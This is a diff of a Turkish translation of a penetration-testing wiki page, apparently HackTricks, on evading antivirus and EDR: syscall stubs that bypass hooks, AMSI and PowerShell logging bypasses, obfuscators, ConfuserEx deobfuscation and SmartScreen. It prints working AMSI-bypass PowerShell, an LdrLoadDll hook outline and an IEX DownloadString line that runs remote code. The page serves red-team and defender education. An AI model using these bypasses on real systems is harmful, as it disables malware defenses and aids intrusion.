+EDR'ler sıklıkla `ntdll.dll` syscall stub'larına **user-mode inline hook'lar** yerleştirir. Bu hook'ları bypass etmek için, doğru **SSN**'yi (System Service Number) yükleyen ve hook'lanmış export entrypoint'i çalıştırmadan kernel mode'a geçiş yapan **direct** veya **indirect syscall stub'ları** oluşturabilirsiniz.
 
-**Invocation options:**
-- **Direct (embedded)**: üretilen stub içine bir `syscall`/`sysenter`/`SVC #0` instruction yerleştirir (`ntdll` export'una uğramaz).
-- **Indirect**: kernel transition'ın `ntdll`'den geliyormuş gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için yararlıdır); **randomized indirect** her çağrı için bir havuzdan gadget seçer.
-- **Egg-hunt**: diskte statik `0F 05` opcode dizisini gömmekten kaçınır; runtime'da bir syscall sequence çözer.
+**Invocation seçenekleri:**
+- **Direct (embedded)**: Oluşturulan stub'a bir `syscall`/`sysenter`/`SVC #0` instruction'ı ekler (`ntdll` export'una erişilmez).
+- **Indirect**: Kernel geçişinin `ntdll`'den kaynaklanmış gibi görünmesi için `ntdll` içindeki mevcut bir `syscall` gadget'ına atlar (heuristic evasion için kullanışlıdır); **randomized indirect**, her çağrı için bir pool içinden gadget seçer.
+- **Egg-hunt**: Statik `0F 05` opcode dizisini disk üzerinde embed etmekten kaçınır; bir syscall sequence'ını runtime sırasında resolve eder.
 
-**Hook-resistant SSN resolution strategies:**
-- **FreshyCalls (VA sort)**: stub byte'larını okumak yerine syscall stub'larını virtual address'e göre sıralayarak SSN'leri çıkarır.
-- **SyscallsFromDisk**: temiz bir `\KnownDlls\ntdll.dll` map eder, `.text` içinden SSN'leri okur, sonra unmap eder (bellekteki tüm hook'ları aşar).
-- **RecycledGate**: bir stub temiz olduğunda VA-sorted SSN çıkarımı ile opcode validation'ı birleştirir; hook'luysa VA çıkarımına geri döner.
-- **HW Breakpoint**: `syscall` instruction üzerinde DR0 ayarlar ve hooked byte'ları parse etmeden runtime'da `EAX` içinden SSN'yi yakalamak için bir VEH kullanır.
+**Hook-resistant SSN resolution stratejileri:**
+- **FreshyCalls (VA sort)**: SSN'leri stub byte'larını okumak yerine syscall stub'larını virtual address'e göre sıralayarak çıkarır.
+- **SyscallsFromDisk**: Temiz bir `\KnownDlls\ntdll.dll` map'ler, SSN'leri `.text` bölümünden okur, ardından map'i kaldırır (bellek içindeki tüm hook'ları bypass eder).
+- **RecycledGate**: VA-sorted SSN inference'ı, stub temiz olduğunda opcode validation ile birleştirir; hook varsa VA inference'a geri döner.
+- **HW Breakpoint**: `syscall` instruction'ı üzerinde DR0 ayarlar ve hook'lanmış byte'ları parse etmeden runtime sırasında `EAX` içindeki SSN'yi yakalamak için bir VEH kullanır.
 
-Örnek SysWhispers4 kullanımı:
+SysWhispers4 kullanım örneği:
 ```bash
 # Indirect syscalls + hook-resistant resolution
 python syswhispers.py --preset injection --method indirect --resolve recycled
@@ -250,49 +250,49 @@ python syswhispers.py --functions NtAllocateVirtualMemory,NtCreateThreadEx --res
 ```
 ## AMSI (Anti-Malware Scan Interface)
 
-AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)"i önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu, bu yüzden payload'ları somehow **doğrudan in-memory** çalıştırabilirseniz, AV bunu engellemek için hiçbir şey yapamazdı; çünkü yeterli görünürlüğe sahip değildi.
+AMSI, "[fileless malware](https://en.wikipedia.org/wiki/Fileless_malware)" tehditlerini önlemek için oluşturuldu. Başlangıçta AV'ler yalnızca **diskteki dosyaları** tarayabiliyordu; bu nedenle payload'ları herhangi bir şekilde **doğrudan bellekte** çalıştırabilirseniz, AV yeterli görünürlüğe sahip olmadığından bunu önlemek için hiçbir şey yapamıyordu.
 
-AMSI özelliği Windows'un şu bileşenlerine entegre edilmiştir.
+AMSI özelliği, Windows'un şu bileşenlerine entegre edilmiştir.
 
-- User Account Control, veya UAC (EXE, COM, MSI veya ActiveX installation yükseltmesi)
-- PowerShell (scripts, interactive use ve dynamic code evaluation)
+- User Account Control veya UAC (EXE, COM, MSI ya da ActiveX kurulumu için elevation)
+- PowerShell (script'ler, etkileşimli kullanım ve dynamic code evaluation)
 - Windows Script Host (wscript.exe ve cscript.exe)
 - JavaScript ve VBScript
-- Office VBA macros
+- Office VBA macro'ları
 
-Bu, script contents'i şifresiz ve obfuscated olmayan bir biçimde açığa çıkararak antivirus çözümlerinin script davranışını incelemesine olanak tanır.
+Antivirus çözümlerinin script içeriklerini hem şifrelenmemiş hem de obfuscation uygulanmamış biçimde sunarak script davranışlarını incelemesine olanak tanır.
 
-`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` çalıştırmak, Windows Defender'da aşağıdaki alert'i üretir.
+`IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1')` komutunu çalıştırmak, Windows Defender üzerinde aşağıdaki alert'i oluşturur.
 
 <figure><img src="../images/image (1135).png" alt=""><figcaption></figcaption></figure>
 
-`amsi:` ifadesini ve ardından script'in çalıştığı executable'ın path'ini nasıl öne eklediğine dikkat edin; bu durumda powershell.exe
+`amsi:` önekini ve ardından script'in çalıştığı executable'ın path'ini eklediğine dikkat edin; bu örnekte executable powershell.exe'dir.
 
-Disk'e herhangi bir file bırakmadık, ama yine de AMSI nedeniyle in-memory yakalandık.
+Diske herhangi bir dosya bırakmadık, ancak yine de AMSI nedeniyle bellekte yakalandık.
 
-Ayrıca, **.NET 4.8** ile birlikte C# code de AMSI üzerinden çalıştırılır. Bu durum `Assembly.Load(byte[])` kullanımını da in-memory execution yüklemek için etkiler. Bu yüzden AMSI'den kaçınmak istiyorsanız in-memory execution için daha düşük .NET sürümlerinin (örneğin 4.7.2 veya altı) kullanılması önerilir.
+Ayrıca, **.NET 4.8**'den itibaren C# code da AMSI üzerinden çalıştırılır. Bu durum, bellekte execution yüklemek için `Assembly.Load(byte[])` kullanımını bile etkiler. Bu nedenle, AMSI'dden kaçınmak istiyorsanız bellekte execution için daha düşük .NET sürümlerinin (4.7.2 veya altı gibi) kullanılması önerilir.
 
-AMSI'yi atlatmanın birkaç yolu vardır:
+AMSI'yi aşmanın birkaç yolu vardır:
 
 - **Obfuscation**
 
-AMSI esas olarak static detections ile çalıştığından, yüklemeye çalıştığınız scripts'i değiştirmek detection'dan kaçınmak için iyi bir yol olabilir.
+AMSI esas olarak static detection'larla çalıştığından, yüklemeye çalıştığınız script'leri değiştirmek detection'dan kaçınmak için iyi bir yöntem olabilir.
 
-Ancak AMSI, birden fazla katman olsa bile scripts'in obfuscation'ını kaldırma yeteneğine sahiptir; bu yüzden bunun nasıl yapıldığına bağlı olarak obfuscation kötü bir seçenek olabilir. Bu da onu evasion açısından pek straightforward yapmaz. Yine de bazen tek yapmanız gereken birkaç variable name değiştirmektir ve yeterli olur; yani ne kadar flag'lendiğine bağlıdır.
+Ancak AMSI, birden fazla katman olsa bile script'lerin obfuscation'ını kaldırma yeteneğine sahiptir; bu nedenle obfuscation, nasıl yapıldığına bağlı olarak kötü bir seçenek olabilir. Bu da AMSI'den kaçınmayı çok straightforward olmayan bir işlem haline getirir. Bununla birlikte bazen yalnızca birkaç variable adını değiştirmeniz yeterli olabilir; bu nedenle durum, bir şeyin ne ölçüde flag'lendiğine bağlıdır.
 
 - **AMSI Bypass**
 
-AMSI, powershell (ayrıca cscript.exe, wscript.exe, vb.) process'ine bir DLL yüklenerek implement edildiği için, privileged olmayan bir user olarak çalışırken bile onu kolayca manipüle etmek mümkündür. AMSI implementasyonundaki bu flaw nedeniyle araştırmacılar AMSI scanning'den kaçmanın birden fazla yolunu bulmuştur.
+AMSI, powershell (ayrıca cscript.exe, wscript.exe vb.) process'ine bir DLL yüklenerek implement edildiğinden, unprivileged user olarak çalışırken bile kolayca üzerinde oynama yapılabilir. AMSI implementasyonundaki bu flaw nedeniyle araştırmacılar, AMSI scanning'den kaçınmak için birden fazla yöntem bulmuştur.
 
 **Forcing an Error**
 
-AMSI initialization'ın fail olmasını zorlamak (amsiInitFailed), mevcut process için hiçbir scan başlatılmamasına neden olur. Bu durum ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklanmıştır ve Microsoft daha geniş kullanımını önlemek için bir signature geliştirmiştir.
+AMSI initialization'ını başarısız olmaya zorlamak (amsiInitFailed), mevcut process için hiçbir scan başlatılmamasını sağlar. Bu yöntem ilk olarak [Matt Graeber](https://twitter.com/mattifestation) tarafından açıklandı ve Microsoft, daha geniş kullanımını önlemek için bir signature geliştirdi.
 ```bash
 [Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
 ```
-Mevcut powershell işlemi için AMSI’yi kullanılamaz hale getirmek sadece tek bir satır powershell kodu gerektirdi. Bu satır elbette AMSI tarafından da işaretlendi, bu yüzden bu tekniği kullanmak için bazı değişiklikler gerekiyor.
+Mevcut PowerShell process'i için AMSI'yi kullanılamaz hâle getirmek yalnızca tek satırlık PowerShell kodu gerektirdi. Elbette bu satır AMSI tarafından da flag'lendi, bu nedenle bu tekniği kullanabilmek için bazı değişiklikler yapılması gerekiyor.
 
-İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) içinden aldığım değiştirilmiş bir AMSI bypass:
+İşte bu [Github Gist](https://gist.github.com/r00t-3xp10it/a0c6a368769eec3d3255d4814802b5db) üzerinden aldığım değiştirilmiş AMSI bypass.
 ```bash
 Try{#Ams1 bypass technic nº 2
 $Xdatabase = 'Utils';$Homedrive = 'si'
@@ -306,22 +306,22 @@ $Spotfix = $SDcleanup.GetField($Rawdata,"$ComponentDeviceId,Static")
 $Spotfix.SetValue($null,$true)
 }Catch{Throw $_}
 ```
-Keep in mind, that this will probably get flagged once this post comes out, so you should not publish any code if your plan is staying undetected.
+Bunu aklınızda bulundurun: Bu gönderi yayınlandığında büyük olasılıkla flag'lenecektir; bu nedenle amacınız undetected kalmaksa herhangi bir code yayınlamamalısınız.
 
 **Memory Patching**
 
-Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedildi ve amsi.dll içindeki "AmsiScanBuffer" fonksiyonu için adresi bulmayı (kullanıcı tarafından sağlanan girdiyi taramaktan sorumlu) ve bunu E_INVALIDARG için dönüş kodunu verecek talimatlarla üzerine yazmayı içerir; bu şekilde, gerçek taramanın sonucu 0 döner ve bu da temiz bir sonuç olarak yorumlanır.
+Bu teknik ilk olarak [@RastaMouse](https://twitter.com/_RastaMouse/) tarafından keşfedilmiştir. Teknik, amsi.dll içindeki `"AmsiScanBuffer"` function'ının (kullanıcı tarafından sağlanan input'u taramaktan sorumludur) adresini bulmayı ve bu adresi `E_INVALIDARG` code'unu döndürecek instructions ile overwrite etmeyi içerir. Böylece gerçek scan'in sonucu 0 döner ve bu değer temiz bir sonuç olarak yorumlanır.
 
 > [!TIP]
-> Daha ayrıntılı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) okuyun.
+> Daha detaylı bir açıklama için lütfen [https://rastamouse.me/memory-patching-amsi-bypass/](https://rastamouse.me/memory-patching-amsi-bypass/) adresini okuyun.
 
-Ayrıca powershell ile AMSI'yi bypass etmek için kullanılan başka birçok teknik de vardır, bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.
+AMSI'yi powershell ile bypass etmek için kullanılan birçok başka teknik de vardır. Bunlar hakkında daha fazla bilgi edinmek için [**bu sayfaya**](basic-powershell-for-pentesters/index.html#amsi-bypass) ve [**bu repo'ya**](https://github.com/S3cur3Th1sSh1t/Amsi-Bypass-Powershell) göz atın.
 
-### amsi.dll yüklenmesini engelleyerek AMSI'yi bloklama (LdrLoadDll hook)
+### amsi.dll yüklemesini engelleyerek AMSI'yi engelleme (LdrLoadDll hook)
 
-AMSI, yalnızca `amsi.dll` geçerli sürece yüklendikten sonra başlatılır. Güçlü ve dil bağımsız bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine kullanıcı-modu bir hook yerleştirip istenen modül `amsi.dll` olduğunda bir hata döndürmektir. Sonuç olarak, AMSI hiç yüklenmez ve o süreç için hiçbir tarama gerçekleşmez.
+AMSI yalnızca `amsi.dll` mevcut process'e yüklendikten sonra initialize edilir. Sağlam ve language-agnostic bir bypass yöntemi, `ntdll!LdrLoadDll` üzerine, istenen module `amsi.dll` olduğunda error döndüren bir user-mode hook yerleştirmektir. Bunun sonucunda AMSI hiçbir zaman yüklenmez ve bu process için scan gerçekleşmez.
 
-Uygulama özeti (x64 C/C++ pseudocode):
+Implementation outline (x64 C/C++ pseudocode):
 ```c
 #include <windows.h>
 #include <winternl.h>
@@ -347,114 +347,114 @@ realLdrLoadDll = (pLdrLoadDll)GetProcAddress(ntdll, "LdrLoadDll");
 // e.g., Microsoft Detours / MinHook / custom 14‑byte jmp thunk
 }
 ```
-Notes
-- PowerShell, WScript/CScript ve custom loaders dahil olmak üzere hepsiyle çalışır (aksi halde AMSI yükleyecek olan herhangi bir şey).
-- Uzun command-line artefact’lerinden kaçınmak için stdin üzerinden script beslemeyle eşleştirin (`PowerShell.exe -NoProfile -NonInteractive -Command -`).
-- LOLBins üzerinden çalışan loader’larda kullanıldığı görüldü (örn. `regsvr32` ile `DllRegisterServer` çağırma).
+Notlar
+- PowerShell, WScript/CScript ve custom loader'lar genelinde çalışır (aksi takdirde AMSI'yi yükleyecek her şey).
+- Uzun command-line artefact'larını önlemek için script'leri stdin üzerinden beslemeyle (`PowerShell.exe -NoProfile -NonInteractive -Command -`) birlikte kullanın.
+- LOLBins üzerinden çalıştırılan loader'larda kullanıldığı görülmüştür (ör. `regsvr32` tarafından `DllRegisterServer` çağrılması).
 
-The tool **[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** also generates script to bypass AMSI.
-The tool **[https://amsibypass.com/](https://amsibypass.com/)** also generates script to bypass AMSI that avoid signature by randomized user-defined function, variables, characters expression and applies random character casing to PowerShell keywords to avoid signature.
+**[https://github.com/Flangvik/AMSI.fail](https://github.com/Flangvik/AMSI.fail)** aracı da AMSI'yi bypass etmek için script oluşturur.
+**[https://amsibypass.com/](https://amsibypass.com/)** aracı da randomized user-defined function, variables, characters expression kullanarak ve signature'ı önlemek için PowerShell keyword'lerinde random character casing uygulayarak signature'ı önleyen AMSI bypass script'leri oluşturur.
 
-**Tespit edilen signature’ı kaldırın**
+**Tespit edilen signature'ı kaldırma**
 
-**[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanarak mevcut process’in memory’sinden tespit edilen AMSI signature’ını kaldırabilirsiniz. Bu tool, current process’in memory’sini AMSI signature’ı için tarayıp ardından bunu NOP instructions ile üzerine yazarak çalışır ve böylece memory’den kaldırır.
+Mevcut process'in memory'sinden tespit edilen AMSI signature'ını kaldırmak için **[https://github.com/cobbr/PSAmsi](https://github.com/cobbr/PSAmsi)** ve **[https://github.com/RythmStick/AMSITrigger](https://github.com/RythmStick/AMSITrigger)** gibi bir tool kullanabilirsiniz. Bu tool, mevcut process'in memory'sini AMSI signature'ı için tarar ve ardından signature'ı NOP instruction'larıyla üzerine yazarak memory'den etkili şekilde kaldırır.
 
-**AMSI kullanan AV/EDR products**
+**AMSI kullanan AV/EDR ürünleri**
 
-**[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** içinde AMSI kullanan AV/EDR products listesini bulabilirsiniz.
+AMSI kullanan AV/EDR ürünlerinin listesini **[https://github.com/subat0mik/whoamsi](https://github.com/subat0mik/whoamsi)** içinde bulabilirsiniz.
 
-**Powershell version 2 kullanın**
-PowerShell version 2 kullanırsanız, AMSI load edilmez; böylece scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
+**PowerShell version 2 kullanın**
+PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz:
 ```bash
 powershell.exe -version 2
 ```
 ## PS Logging
 
-PowerShell logging, sistemde yürütülen tüm PowerShell komutlarını kaydetmenizi sağlayan bir özelliktir. Bu, denetim ve sorun giderme amaçları için yararlı olabilir, ancak aynı zamanda **tespitten kaçmak isteyen saldırganlar için bir sorun** da olabilir.
+PowerShell logging, bir sistemde çalıştırılan tüm PowerShell komutlarını loglamanızı sağlayan bir özelliktir. Bu özellik denetim ve sorun giderme amaçlarıyla faydalı olabilir; ancak **tespitten kaçmak isteyen saldırganlar için bir sorun oluşturabilir**.
 
-PowerShell logging'i atlatmak için aşağıdaki teknikleri kullanabilirsiniz:
+PowerShell logging'i bypass etmek için aşağıdaki teknikleri kullanabilirsiniz:
 
-- **PowerShell Transcription ve Module Logging'i devre dışı bırakın**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir araç kullanabilirsiniz.
-- **Powershell version 2 kullanın**: PowerShell version 2 kullanırsanız, AMSI yüklenmez; böylece scriptlerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şöyle yapabilirsiniz: `powershell.exe -version 2`
-- **Unmanaged Powershell Session kullanın**: Defenses olmadan bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (Cobal Strike içindeki `powerpick` bunu kullanır).
+- **PowerShell Transcription ve Module Logging'i devre dışı bırakma**: Bu amaçla [https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs](https://github.com/leechristensen/Random/blob/master/CSharp/DisablePSLogging.cs) gibi bir tool kullanabilirsiniz.
+- **Powershell version 2 kullanma**: PowerShell version 2 kullanırsanız AMSI yüklenmez; böylece script'lerinizi AMSI tarafından taranmadan çalıştırabilirsiniz. Bunu şu şekilde yapabilirsiniz: `powershell.exe -version 2`
+- **Unmanaged Powershell Session kullanma**: Savunmalar olmadan bir powershell başlatmak için [https://github.com/leechristensen/UnmanagedPowerShell](https://github.com/leechristensen/UnmanagedPowerShell) kullanın (`Cobal Strike` tarafından kullanılan `powerpick` de bunu yapar).
 
 
 ## Obfuscation
 
 > [!TIP]
-> Birkaç obfuscation tekniği veriyi encrypt etmeye dayanır; bu da binary'nin entropy'sini artırır ve AV'lerin ve EDR'lerin bunu tespit etmesini kolaylaştırır. Bununla dikkatli olun ve belki de encryption'ı yalnızca kodunuzun hassas olan ya da gizlenmesi gereken belirli bölümlerine uygulayın.
+> Birçok obfuscation tekniği verileri şifrelemeye dayanır. Bu, binary'nin entropy'sini artırarak AV'lerin ve EDR'ların onu tespit etmesini kolaylaştırır. Buna dikkat edin ve şifrelemeyi yalnızca kodunuzun hassas olan veya gizlenmesi gereken belirli bölümlerine uygulamayı düşünün.
 
-### Deobfuscating ConfuserEx-Protected .NET Binaries
+### ConfuserEx ile Korunan .NET Binary'lerini Deobfuscate Etme
 
-ConfuserEx 2 (veya commercial forks) kullanan malware analiz ederken, decompilers ve sandboxes'ı engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, sonradan dnSpy veya ILSpy gibi araçlarla C#'a decompile edilebilecek neredeyse-orijinal bir IL'i güvenilir şekilde **geri yükler**.
+ConfuserEx 2 (veya ticari fork'larını) kullanan malware'leri analiz ederken, decompiler'ları ve sandbox'ları engelleyen birkaç koruma katmanıyla karşılaşmak yaygındır. Aşağıdaki workflow, daha sonra dnSpy veya ILSpy gibi tool'larda C#'a decompile edilebilecek **orijinale yakın bir IL'yi** güvenilir şekilde geri yükler.
 
-1.  Anti-tampering kaldırma – ConfuserEx her *method body*'yi encrypt eder ve bunu *module* static constructor (`<Module>.cctor`) içinde decrypt eder. Bu, PE checksum'ını da patch'ler; bu yüzden herhangi bir değişiklik binary'nin crash olmasına neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR key'lerini geri almak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
+1. Anti-tampering removal – ConfuserEx her *method body*'yi şifreler ve şifresini *module* static constructor'ı (`<Module>.cctor`) içinde çözer. Ayrıca PE checksum'ını patch'ler; bu nedenle herhangi bir değişiklik binary'nin crash olmasına neden olur. Şifrelenmiş metadata tablolarını bulmak, XOR key'lerini kurtarmak ve temiz bir assembly yeniden yazmak için **AntiTamperKiller** kullanın:
 ```bash
 # https://github.com/wwh1004/AntiTamperKiller
 python AntiTamperKiller.py Confused.exe Confused.clean.exe
 ```
-Output, kendi unpacker'ınızı oluştururken yararlı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.
+Output, kendi unpacker'ınızı oluştururken faydalı olabilecek 6 anti-tamper parametresini (`key0-key3`, `nameHash`, `internKey`) içerir.
 
-2.  Symbol / control-flow recovery – *clean* dosyayı **de4dot-cex**'e verin (de4dot'un ConfuserEx-aware bir fork'u).
+2. Symbol / control-flow recovery – *clean* file'ı **de4dot-cex**'e (ConfuserEx-aware bir de4dot fork'u) verin.
 ```bash
 de4dot-cex -p crx Confused.clean.exe -o Confused.de4dot.exe
 ```
 Flags:
 • `-p crx` – ConfuserEx 2 profile'ını seçer
-• de4dot, control-flow flattening'i geri alır, orijinal namespaces, classes ve variable names'i geri yükler ve constant strings'i decrypt eder.
+• de4dot, control-flow flattening'i geri alır, orijinal namespace'leri, class'ları ve variable name'lerini geri yükler ve constant string'lerin şifresini çözer.
 
-3.  Proxy-call stripping – ConfuserEx, doğrudan method calls'ları decompilation'ı daha fazla bozmak için hafif wrapper'larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
+3. Proxy-call stripping – ConfuserEx, decompilation'ı daha da bozmak için doğrudan method call'larını lightweight wrapper'larla (diğer adıyla *proxy calls*) değiştirir. Bunları **ProxyCall-Remover** ile kaldırın:
 ```bash
 ProxyCall-Remover.exe Confused.de4dot.exe Confused.fixed.exe
 ```
-Bu adımdan sonra `Class8.smethod_10`, … gibi opak wrapper functions yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.
+Bu adımdan sonra, opak wrapper function'lar (`Class8.smethod_10`, …) yerine `Convert.FromBase64String` veya `AES.Create()` gibi normal .NET API'leri görmelisiniz.
 
-4.  Manuel clean-up – ortaya çıkan binary'yi dnSpy altında çalıştırın, büyük Base64 blob'ları veya *real* payload'ı bulmak için `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Çoğu zaman malware bunu `<Module>.byte_0` içinde başlatılan TLV-encoded bir byte array olarak saklar.
+4. Manual clean-up – Ortaya çıkan binary'yi dnSpy altında çalıştırın; *gerçek* payload'ı bulmak için büyük Base64 blob'larını veya `RijndaelManaged`/`TripleDESCryptoServiceProvider` kullanımını arayın. Malware çoğu zaman bunu `<Module>.byte_0` içinde initialize edilen TLV-encoded bir byte array olarak saklar.
 
-Yukarıdaki zincir, malicious örneği çalıştırmaya gerek kalmadan execution flow'u geri yükler – offline bir workstation üzerinde çalışırken faydalıdır.
+Yukarıdaki chain, malicious sample'ı çalıştırmaya **gerek kalmadan** execution flow'u geri yükler. Bu, offline bir workstation üzerinde çalışırken faydalıdır.
 
-> 🛈  ConfuserEx, örnekleri otomatik olarak triage etmek için bir IOC olarak kullanılabilecek `ConfusedByAttribute` adlı custom attribute üretir.
+> 🛈  ConfuserEx, sample'ları otomatik olarak triage etmek için IOC olarak kullanılabilecek `ConfusedByAttribute` adlı özel bir attribute üretir.
 
-#### One-liner
+#### Tek satırlık
 ```bash
 autotok.sh Confused.exe  # wrapper that performs the 3 steps above sequentially
 ```
 ---
 
 - [**InvisibilityCloak**](https://github.com/h4wkst3r/InvisibilityCloak)**: C# obfuscator**
-- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [LLVM](http://www.llvm.org/) derleme paketinin açık kaynaklı bir fork’unu sağlayarak, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve tamper-proofing yoluyla artırılmış yazılım güvenliği sunmaktır.
-- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, harici bir araç kullanmadan ve compiler’ı değiştirmeden, compile time sırasında obfuscated code üretmek için `C++11/14` dilinin nasıl kullanılacağını gösterir.
-- [**obfy**](https://github.com/fritzone/obfy): Uygulamayı crack etmek isteyen kişinin işini biraz daha zorlaştıracak, C++ template metaprogramming framework tarafından üretilen bir katman obfuscated operations ekler.
-- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll, .sys dahil olmak üzere çeşitli farklı pe files dosyalarını obfuscate edebilen bir x64 binary obfuscator’dır
-- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executables için basit bir metamorphic code engine’dir.
-- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanarak LLVM-supported languages için ince taneli code obfuscation framework’üdür. ROPfuscator, normal instructions’ları ROP chains’e dönüştürerek bir programı assembly code level’ında obfuscate eder ve normal control flow hakkındaki doğal algımızı bozar.
-- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter’dır
-- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL’leri shellcode’a dönüştürebilir ve ardından onları yükleyebilir
+- [**Obfuscator-LLVM**](https://github.com/obfuscator-llvm/obfuscator): Bu projenin amacı, [code obfuscation](<http://en.wikipedia.org/wiki/Obfuscation_(software)>) ve kurcalamaya karşı koruma yoluyla artırılmış software security sağlayabilen, [LLVM](http://www.llvm.org/) compilation suite'in open-source bir fork'unu sunmaktır.
+- [**ADVobfuscator**](https://github.com/andrivet/ADVobfuscator): ADVobfuscator, herhangi bir external tool kullanmadan ve compiler'ı değiştirmeden, `C++11/14` language kullanarak compile time'da obfuscated code üretmeyi gösterir.
+- [**obfy**](https://github.com/fritzone/obfy): C++ template metaprogramming framework tarafından oluşturulan ve application'ı crack etmek isteyen kişinin işini biraz zorlaştıracak bir obfuscated operations katmanı ekler.
+- [**Alcatraz**](https://github.com/weak1337/Alcatraz)**:** Alcatraz, .exe, .dll ve .sys dahil olmak üzere çeşitli PE file'ları obfuscate edebilen bir x64 binary obfuscator'dır.
+- [**metame**](https://github.com/a0rtega/metame): Metame, arbitrary executable'lar için basit bir metamorphic code engine'dir.
+- [**ropfuscator**](https://github.com/ropfuscator/ropfuscator): ROPfuscator, ROP (return-oriented programming) kullanan, LLVM-supported language'ler için fine-grained bir code obfuscation framework'üdür. ROPfuscator, regular instruction'ları ROP chain'lerine dönüştürerek bir programı assembly code seviyesinde obfuscate eder ve normal control flow'a ilişkin doğal algımızı engeller.
+- [**Nimcrypt**](https://github.com/icyguider/nimcrypt): Nimcrypt, Nim ile yazılmış bir .NET PE Crypter'dır.
+- [**inceptor**](https://github.com/klezVirus/inceptor)**:** Inceptor, mevcut EXE/DLL'leri shellcode'a dönüştürebilir ve ardından yükleyebilir.
 
 ## SmartScreen & MoTW
 
-İnternetten bazı executables indirip çalıştırdığınızda bu ekranı görmüş olabilirsiniz.
+İnternetten bazı executable'ları indirip çalıştırırken bu ekranı görmüş olabilirsiniz.
 
-Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak malicious uygulamaları çalıştırmaktan korumayı amaçlayan bir security mechanism’dir.
+Microsoft Defender SmartScreen, son kullanıcıyı potansiyel olarak malicious application'ları çalıştırmaya karşı korumak için tasarlanmış bir security mechanism'dir.
 
 <figure><img src="../images/image (664).png" alt=""><figcaption></figcaption></figure>
 
-SmartScreen temel olarak reputation-based bir yaklaşımla çalışır; yani alışılmadık şekilde indirilen uygulamalar SmartScreen’i tetikler, böylece son kullanıcıyı uyarır ve dosyanın çalıştırılmasını engeller (ancak More Info -> Run anyway’e tıklanarak dosya yine de çalıştırılabilir).
+SmartScreen temel olarak reputation-based bir yaklaşım kullanır; yani yaygın olarak indirilmeyen application'lar SmartScreen'i tetikleyerek son kullanıcıyı uyarır ve file'ı çalıştırmasını engeller (ancak file, More Info -> Run anyway seçeneğine tıklanarak yine de çalıştırılabilir).
 
-**MoTW** (Mark of The Web), internetten indirilen dosyalar oluşturulduğunda URL ile birlikte otomatik olarak yaratılan, Zone.Identifier adlı bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)’dir.
+**MoTW** (Mark of The Web), internetten indirilen file'lar indirildikleri URL ile birlikte otomatik olarak oluşturulan ve Zone.Identifier adını taşıyan bir [NTFS Alternate Data Stream](<https://en.wikipedia.org/wiki/NTFS#Alternate_data_stream_(ADS)>)'dir.
 
-<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir dosya için Zone.Identifier ADS kontrol ediliyor.</p></figcaption></figure>
+<figure><img src="../images/image (237).png" alt=""><figcaption><p>İnternetten indirilen bir file için Zone.Identifier ADS'nin kontrol edilmesi.</p></figcaption></figure>
 
 > [!TIP]
-> **trusted** bir signing certificate ile imzalanmış executables’ın **SmartScreen’i tetiklemeyeceğini** not etmek önemlidir.
